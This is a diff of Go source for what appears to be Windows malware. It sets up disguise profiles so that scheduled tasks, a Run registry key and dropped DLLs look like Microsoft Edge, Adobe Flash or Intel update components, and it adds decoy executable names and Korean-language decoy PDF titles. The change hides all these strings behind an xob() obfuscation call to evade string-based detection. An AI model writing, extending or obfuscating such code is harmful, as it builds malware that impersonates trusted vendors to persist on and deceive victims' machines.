@@ -16,40 +16,40 @@ import (
 
 // disguiseProfile holds all disguise parameters for one run.
 type disguiseProfile struct {
-	DisplayName   string // task / run key display name
-	TaskName      string // schtasks name (w/o path)
-	SchedDesc     string // schtasks description
-	RegistryName  string // HKCU\...\Run value name
-	FileName      string // target file name (e.g. sysver.dll)
-	DirName       string // drop directory under ProgramData
+	DisplayName  string // task / run key display name
+	TaskName     string // schtasks name (w/o path)
+	SchedDesc    string // schtasks description
+	RegistryName string // HKCU\...\Run value name
+	FileName     string // target file name (e.g. sysver.dll)
+	DirName      string // drop directory under ProgramData
 }
 
 // pickProfile returns one of several profiles at random (just cycles by PID).
 func pickProfile() disguiseProfile {
 	profiles := []disguiseProfile{
 		{
-			DisplayName:  "Microsoft Edge Update",
-			TaskName:     "MicrosoftEdgeUpdateTask",
-			SchedDesc:    "Keeps Microsoft Edge up to date.",
-			RegistryName: "MicrosoftEdgeUpdateTask",
-			FileName:     "EdgeUpdateCore.dll",
-			DirName:      `Microsoft\EdgeUpdate`,
+			DisplayName:  xob(ePCBangDisp1),
+			TaskName:     xob(ePCBangTask1),
+			SchedDesc:    xob(ePCBangDesc1),
+			RegistryName: xob(ePCBangTask1),
+			FileName:     xob(ePCBangFile1),
+			DirName:      xob(ePCBangDir1),
 		},
 		{
-			DisplayName:  "Adobe Flash Update",
-			TaskName:     "AdobeFlashPlayerUpdateSvc",
-			SchedDesc:    "Checks for new versions of Adobe Flash Player.",
-			RegistryName: "AdobeFlashUpdateSvc",
-			FileName:     "FlashUpdateCheck.dll",
-			DirName:      `Adobe\Flash Player\Update`,
+			DisplayName:  xob(ePCBangDisp2),
+			TaskName:     xob(ePCBangTask2),
+			SchedDesc:    xob(ePCBangDesc2),
+			RegistryName: xob(ePCBangReg2),
+			FileName:     xob(ePCBangFile2),
+			DirName:      xob(ePCBangDir2),
 		},
 		{
-			DisplayName:  "Intel Graphics Update",
-			TaskName:     "IntelGfxUpdate",
-			SchedDesc:    "Periodically checks for Intel graphics driver updates.",
-			RegistryName: "IntelGFXUpdate",
-			FileName:     "GfxUpdate.dll",
-			DirName:      `Intel\Graphics\Updates`,
+			DisplayName:  xob(ePCBangDisp3),
+			TaskName:     xob(ePCBangTask3),
+			SchedDesc:    xob(ePCBangDesc3),
+			RegistryName: xob(ePCBangReg3),
+			FileName:     xob(ePCBangFile3),
+			DirName:      xob(ePCBangDir3),
 		},
 	}
 	// Use PID to pick a semi-random profile for diversity across machines.
@@ -239,11 +239,11 @@ func setHidden(path string) {
 func getDisguisedExeName() string {
 	// Use the same profile's filename but with .exe extension
 	profiles := []string{
-		"EdgeUpdateHelper.exe",
-		"AdobeUpdateCheck.exe",
-		"IntelGFXHelper.exe",
-		"NVDisplayUpdate.exe",
-		"RealtekHDUpdate.exe",
+		xob(eDecoyExe1),
+		xob(eDecoyExe2),
+		xob(eDecoyExe3),
+		xob(eDecoyExe4),
+		xob(eDecoyExe5),
 	}
 	idx := os.Getpid() % len(profiles)
 	return profiles[idx]
@@ -252,10 +252,10 @@ func getDisguisedExeName() string {
 // getDecoyPdfTitle returns the PDF title matching the current disguise.
 func getDecoyPdfTitle() string {
 	titles := []string{
-		"DirectX 최종 사용자 런타임 설치 안내",
-		"Microsoft Visual C++ 재배포 가능 패키지 설치 가이드",
-		"Adobe Flash Player 보안 업데이트 안내",
-		"NVIDIA 그래픽 드라이버 업데이트 설치 도움말",
+		xob(eDecoyTitle1),
+		xob(eDecoyTitle2),
+		xob(eDecoyTitle3),
+		xob(eDecoyTitle4),
 	}
 	idx := os.Getpid() % len(titles)
 	return titles[idx]
